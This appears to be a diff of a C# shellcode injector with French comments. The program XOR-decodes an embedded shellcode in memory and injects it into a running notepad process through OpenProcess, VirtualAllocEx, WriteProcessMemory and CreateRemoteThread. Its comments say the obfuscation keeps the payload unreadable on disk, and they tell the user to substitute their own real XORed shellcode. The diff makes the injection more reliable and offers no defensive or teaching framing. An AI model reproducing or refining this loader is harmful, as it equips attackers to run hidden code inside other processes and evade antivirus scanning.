@@ -59,7 +59,7 @@ namespace ShellcodeInjector
         {
             try
             {
-                // ===== 1️⃣ RÉCUPÉRATION DU PROCESSUS CIBLE =====
+                // ===== 1️. RÉCUPÉRATION DU PROCESSUS CIBLE =====
 
                 Process[] processes = Process.GetProcessesByName("notepad");
 
@@ -72,33 +72,34 @@ namespace ShellcodeInjector
                 Process targetProcess = processes[0];
                 Console.WriteLine($"Injection dans {targetProcess.ProcessName} (PID {targetProcess.Id})");
 
-                // ===== 2️⃣ SHELLCODE OBFUSQUÉ (XOR) =====
+                // ===== 2️. SHELLCODE OBFUSQUÉ (XOR) =====
                 // IMPORTANT :
                 // Le shellcode n'est PLUS en clair.
                 // Chaque byte a été XORé avec une clé (0xAA ici).
 
+                // Exemple minimaliste : ici 12 bytes XORés, 
+                // à remplacer par TON vrai shellcode XORé
                 byte[] encodedShellcode = new byte[]
                 {
                     0xE2, 0x9B, 0x63, 0xCF, 0xE2, 0x21, 0xEB, 0xCA,
                     0xE2, 0x21, 0xEA, 0xB2
-                    // (exemple, garde TON shellcode réel XORé)
                 };
 
                 // Clé XOR (simple, volontairement faible)
                 byte xorKey = 0xAA;
 
-                // ===== 3️⃣ DÉOBFUSCATION EN MÉMOIRE =====
+                // ===== 3️. DÉOBFUSCATION EN MÉMOIRE =====
                 // On reconstruit le shellcode original JUSTE AVANT l'injection
                 // -> rien de lisible statiquement sur disque
 
+                // Important : on décode dans un nouveau tableau pour garder encodedShellcode intact
+                byte[] shellcode = new byte[encodedShellcode.Length];
                 for (int i = 0; i < encodedShellcode.Length; i++)
                 {
-                    encodedShellcode[i] ^= xorKey;
+                    shellcode[i] = (byte)(encodedShellcode[i] ^ xorKey);
                 }
 
-                byte[] shellcode = encodedShellcode;
-
-                // ===== 4️⃣ OUVERTURE DU PROCESSUS =====
+                // ===== 4️. OUVERTURE DU PROCESSUS =====
 
                 IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
                 if (hProcess == IntPtr.Zero)
@@ -107,7 +108,7 @@ namespace ShellcodeInjector
                     return;
                 }
 
-                // ===== 5️⃣ ALLOCATION MÉMOIRE DANS LE PROCESSUS CIBLE =====
+                // ===== 5️. ALLOCATION MÉMOIRE DANS LE PROCESSUS CIBLE =====
 
                 IntPtr allocMemAddress = VirtualAllocEx(
                     hProcess,
@@ -123,23 +124,23 @@ namespace ShellcodeInjector
                     return;
                 }
 
-                // ===== 6️⃣ COPIE DU SHELLCODE =====
+                // ===== 6️. COPIE DU SHELLCODE =====
 
                 bool result = WriteProcessMemory(
                     hProcess,
                     allocMemAddress,
                     shellcode,
                     (uint)shellcode.Length,
-                    out _
+                    out IntPtr bytesWritten
                 );
 
-                if (!result)
+                if (!result || bytesWritten.ToInt32() != shellcode.Length)
                 {
-                    Console.WriteLine("WriteProcessMemory a échoué.");
+                    Console.WriteLine("WriteProcessMemory a échoué ou taille incorrecte.");
                     return;
                 }
 
-                // ===== 7️⃣ EXÉCUTION VIA THREAD DISTANT =====
+                // ===== 7️. EXÉCUTION VIA THREAD DISTANT =====
 
                 IntPtr hThread = CreateRemoteThread(
                     hProcess,
@@ -148,7 +149,7 @@ namespace ShellcodeInjector
                     allocMemAddress,
                     IntPtr.Zero,
                     0,
-                    out _
+                    out IntPtr threadId
                 );
 
                 if (hThread == IntPtr.Zero)
@@ -157,7 +158,9 @@ namespace ShellcodeInjector
                     return;
                 }
 
+                // Attente de la fin du thread distant
                 WaitForSingleObject(hThread, INFINITE);
+
                 Console.WriteLine("Injection terminée (shellcode XOR décodé en mémoire).");
             }
             catch (Exception ex)
